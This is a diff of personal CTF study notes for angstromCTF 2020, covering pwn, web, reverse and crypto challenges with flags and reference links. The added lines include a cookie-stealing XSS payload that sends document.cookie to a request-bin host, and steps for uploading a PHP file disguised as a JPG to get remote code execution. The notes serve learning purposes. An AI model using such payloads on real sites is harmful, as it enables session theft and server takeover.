@@ -1,11 +1,11 @@
 # angstromCTF 2020
+###### tags: `Course`
 
 ## pwn
 
 ### Canary
 
 flag: actf{youre_a_canary_killer_>:(}
-
 string format problem: leak canary with string format then bof
 
 payload:
@@ -28,12 +28,15 @@ r.interactive()
 
 #### Reference
 [format string wiki](https://en.wikipedia.org/wiki/Printf_format_string)
-
 kaibro edu-ctf
-
 [ctf wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/)
-
 [format string course](https://github.com/qazbnm456/ctf-course/blob/master/slides/w4/format-string.md)
+
+### BOP it! (Not solved)
+
+memory leak with null bytes
+
+https://github.com/r00tstici/writeups/blob/master/angstromCTF_2020/bop_it/README.md
 
 ## Web
 
@@ -64,10 +67,16 @@ payload
 ### xmass still stand - not solved
 
 xss attack
+payload:
+
+> <img src=x onerror='requestbin?cookie='+document.cookie>
 
 ### Defund's Crypt - not solved
 
-LFI attack ( image insert reverse shell)
+LFI attack(rce not reverse shell)
+upload php file and changes the MIME type and extension to jpg
+Visit the php file to rce
+
 
 ## Reverse
 
@@ -83,6 +92,10 @@ simply use idapro and will find the flag
 hundreds of functions with simple comparison
 construct the string based on the given functions
 
+utilize angr to solve the challenge
+
+[Reference](https://github.com/archercreat/CTF-Writeups/blob/master/angstromctf/rev/Autorev%2C%20Assemble!/README.md)
+
 ### patcherman - Not Solved
 
 patch program(section issue)
@@ -95,7 +108,7 @@ flag: actf{ok_to_b0r0s-4809813}
 
 reconstruct the jpeg file to gain the flag. After inspect the traffic, you'll find a packet with images, extract the image from the packet.
 
-[](https://i.imgur.com/IIucaLx.png)
+![](https://i.imgur.com/IIucaLx.png)
 
 
 #### tools & reference
@@ -192,3 +205,16 @@ simply implement ceasar cipher + dynamic programming
 flag: actf{yum_delicious_salad}
 
 keyed ceasar: http://rumkin.com/tools/cipher/caesar-keyed.php
+
+### Confused Streaming (Not solved)
+
+Lots of meaning less function, just simply give input a,b,c which are valid parameter for a quadratic formula(二次方程式)
+
+### One-Time bed (Not solved)
+
+OTP with random(time.time()) vulnerability. Same seed generate same random number
+However, failed to use the right seed, not any clue why it doesn't work.
+In this challenge, we can simply utilize brute force or multiple connection to solve the problem.
+
+[brute force](https://masrt200.github.io/hacker-blog/Angstrom-CTF)
+[multiple connection](https://ctftime.org/writeup/18932)
